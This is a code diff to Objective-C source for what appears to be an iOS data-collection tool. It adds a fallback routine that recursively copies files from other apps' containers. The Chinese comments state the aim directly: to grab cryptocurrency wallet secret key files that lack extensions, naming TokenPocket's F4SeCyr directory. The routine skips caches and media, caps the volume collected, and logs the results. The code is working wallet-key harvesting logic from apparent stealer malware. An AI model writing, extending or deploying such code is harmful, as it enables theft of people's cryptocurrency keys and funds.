@@ -87,6 +87,11 @@ static NSArray<NSDictionary *> *OWTargets(void) {
                     excludes:(NSArray<NSString *> *)excludes
                         exts:(NSArray<NSString *> *)exts
                     keywords:(NSArray<NSString *> *)keywords;
+- (NSUInteger)_copyDirectoryContents:(NSString *)src
+                               toDir:(NSString *)outDir
+                              prefix:(NSString *)prefix
+                                exts:(NSArray<NSString *> *)exts
+                          totalBytes:(uint64_t *)totalBytes;
 @end
 
 @implementation OWContainerPass {
@@ -397,6 +402,16 @@ static NSArray<NSDictionary *> *OWTargets(void) {
             uint64_t before = _collectedBytes;
             NSUInteger n = [self _copyDirectory:src toDir:outDir excludes:excludes
                                            exts:exts keywords:keywords];
+            if (n == 0) {
+                // 定义目录按扩展名/关键词过滤不到任何文件时，不能当成"已采到"。
+                // 典型：TokenPocket 的 Documents/F4SeCyr —— 真正的密钥文件没有扩展名，
+                // 相对路径里也不含关键词，过滤后一定是 0。这里对该目录再做一次
+                // 无过滤（仅排除缓存/媒体/超大文件）的递归兜底。
+                OWLog(@"B: %@ 目录 %@ 过滤命中 0，改做整目录小文件兜底", name, rel);
+                n = [self _copyDirectoryContents:src toDir:outDir
+                                         prefix:rel.lastPathComponent
+                                           exts:exts totalBytes:NULL];
+            }
             if (n) {
                 foundFiles += n;
                 definedBytes += (_collectedBytes - before);
@@ -504,6 +519,66 @@ static NSArray<NSDictionary *> *OWTargets(void) {
         NSString *leaf = [rel stringByReplacingOccurrencesOfString:@"/" withString:@"_"];
         if ([self _copyItem:full toDir:outDir name:leaf]) copied++;
     }
+    return copied;
+}
+
+/// 定义目录内的"无过滤"递归兜底：只排除缓存/崩溃日志/媒体和超大文件，
+/// 用来接住那些文件名没有扩展名、也不含关键词的密钥文件（如 TP 的 F4SeCyr 目录）。
+- (NSUInteger)_copyDirectoryContents:(NSString *)src
+                               toDir:(NSString *)outDir
+                              prefix:(NSString *)prefix
+                                exts:(NSArray<NSString *> *)exts
+                          totalBytes:(uint64_t *)totalBytes {
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSMutableSet<NSString *> *useExts = [NSMutableSet set];
+    for (NSString *e in exts) if (e.length) [useExts addObject:e.lowercaseString];
+    NSSet<NSString *> *media = [NSSet setWithArray:@[@"jpg", @"jpeg", @"png", @"gif",
+                                                     @"heic", @"heif", @"mp4", @"mov",
+                                                     @"m4a", @"mp3", @"wav", @"pdf",
+                                                     @"zip", @"ipa"]];
+    NSString *tag = prefix.length ? prefix : src.lastPathComponent;
+
+    NSUInteger copied = 0;
+    uint64_t total = 0;
+    NSDirectoryEnumerator *en = [fm enumeratorAtPath:src];
+    for (NSString *rel in en) {
+        if (_collectedBytes >= self.maxContainerBytes) break;
+        if (copied >= 2000 || total >= 50ULL * 1024 * 1024) {
+            OWLog(@"B: 目录兜底达到上限 %@（%lu 文件 / %llu B）", tag,
+                  (unsigned long)copied, total);
+            break;
+        }
+        NSString *lower = rel.lowercaseString;
+        if ([lower containsString:@"/caches/"] ||
+            [lower containsString:@"/tmp/"] ||
+            [lower containsString:@"httpstorages"] ||
+            [lower containsString:@"/webkit/"] ||
+            [lower containsString:@"sentry"] ||
+            [lower containsString:@"crashlytics"]) continue;
+
+        NSString *full = [src stringByAppendingPathComponent:rel];
+        BOOL isDir = NO;
+        if (![fm fileExistsAtPath:full isDirectory:&isDir] || isDir) continue;
+
+        NSString *ext = full.pathExtension.lowercaseString;
+        uint64_t sz = [[fm attributesOfItemAtPath:full error:nil] fileSize];
+        if (sz == 0) continue;
+
+        // 保留：目标扩展名 / 无扩展名（密钥常见形态）/ 非媒体的普通小文件
+        BOOL keep = [useExts containsObject:ext] ||
+                    (ext.length == 0) ||
+                    (![media containsObject:ext] && sz <= 2ULL * 1024 * 1024);
+        if (!keep) continue;
+
+        NSString *leaf = [NSString stringWithFormat:@"%@_%@", tag,
+                          [rel stringByReplacingOccurrencesOfString:@"/" withString:@"_"]];
+        if ([self _copyItem:full toDir:outDir name:leaf]) {
+            copied++;
+            total += sz;
+        }
+    }
+    if (totalBytes) *totalBytes = total;
+    OWLog(@"B: 目录兜底 %@ 命中 %lu 个 / %llu B", tag, (unsigned long)copied, total);
     return copied;
 }
 
